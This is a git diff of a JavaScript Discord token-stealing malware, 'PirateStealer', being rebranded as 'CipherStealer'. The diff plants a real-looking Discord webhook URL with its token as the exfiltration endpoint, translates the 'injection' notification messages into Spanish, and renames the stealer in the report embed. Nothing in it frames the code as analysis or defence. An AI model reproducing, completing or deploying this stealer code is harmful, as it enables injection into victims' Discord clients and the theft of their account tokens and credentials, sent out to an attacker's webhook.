@@ -4,7 +4,7 @@ const https = require('https');
 const { exec } = require('child_process');
 const axios = require('axios');
 const buf_replace = require('buffer-replace');
-const webhook = "da_webhook"
+const webhook = "https://discord.com/api/webhooks/942121583957381140/Z3Z95cE3MZoI0Lo-_L1AdgYHEtw0qy1hiVlvJRnFE-nv1zFO-2lLKCPYfaXmrBPuum5C"
 
 const config = {
     "logout": "%LOGOUT%1",
@@ -157,7 +157,7 @@ function injectNotify() {
     var fields = [];
     injectPath.forEach( path => {
         var c = {
-            name: ":syringe: Inject Path",
+            name: ":syringe: Ruta de injecion",
             value: `\`\`\`${path}\`\`\``,
             inline: !1
         }
@@ -168,14 +168,14 @@ function injectNotify() {
         "content": null,
         "embeds": [
           {
-            "title": ":detective: Successfull injection",
-            "color": config["embed-color"],
+            "title": ":detective: Injecion colocada correctamente",
+            "color": 0xFF0300,
             "fields": fields,
             "author": {
-              "name": "PirateStealer"
+              "name": "CipherStealer"
             },
             "footer": {
-              "text": "PirateStealer"
+              "text": "Gracias por utilizar CipherStealer."
             }
           }
         ]
